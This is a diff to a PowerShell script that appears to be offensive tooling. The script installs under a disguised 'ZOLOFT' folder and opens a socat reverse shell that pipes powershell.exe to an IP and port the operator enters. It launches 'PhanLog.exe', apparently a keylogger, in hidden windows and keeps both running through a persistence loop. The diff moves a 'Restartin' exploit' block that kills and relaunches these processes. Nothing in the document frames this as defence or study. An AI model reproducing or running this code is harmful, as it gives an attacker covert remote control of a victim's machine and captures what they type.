@@ -1,6 +1,17 @@
 if (Test-Path -Path 'C:\Program Files\ZOLOFT\ZOLOFT\socat-windows-master\ipaddress' -PathType Leaf ){
 	Write-Host "Parameters Already Set"
+	$Restart = Read-Host "Restart? y/n"
+	if($Restart = "y"){
+		
+		Write-Host "Restartin' exploit"	
+		taskkill /IM powershell.exe /F
+	 	taskkill /IM socat.exe /F
+	 	taskkill /IM PhanLog.exe /F
 	
+		powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
+		powershell.exe -windowstyle hidden .\PhanLog\PhanLog.exe
+
+	}
 }else{
 
 $Ip = Read-Host "Enter IP address (0.0.0.0)"
@@ -18,18 +29,7 @@ Write-Host "Created Port Persistance"
 $scriptBlock = [Scriptblock]::Create(@'
 if(Get-Process -Name socat){
 	Write-Host "socat running..."
-	$Restart = Read-Host "Restart? y/n"
-	if($Restart = "y"){
-		
-		Write-Host "Restartin' exploit"	
-		taskkill /IM powershell.exe /F
-	 	taskkill /IM socat.exe /F
-	 	taskkill /IM PhanLog.exe /F
 	
-		powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
-		powershell.exe -windowstyle hidden .\PhanLog\PhanLog.exe
-
-	}
 	
 	
 }else{
@@ -40,7 +40,7 @@ if(Get-Process -Name socat){
 
 }
 '@)
-
+powershell.exe -windowstyle hidden .\PhanLog\PhanLog.exe
 while($true){
 $Ip = Get-Content ipaddress
 $Port = Get-Content portnumber
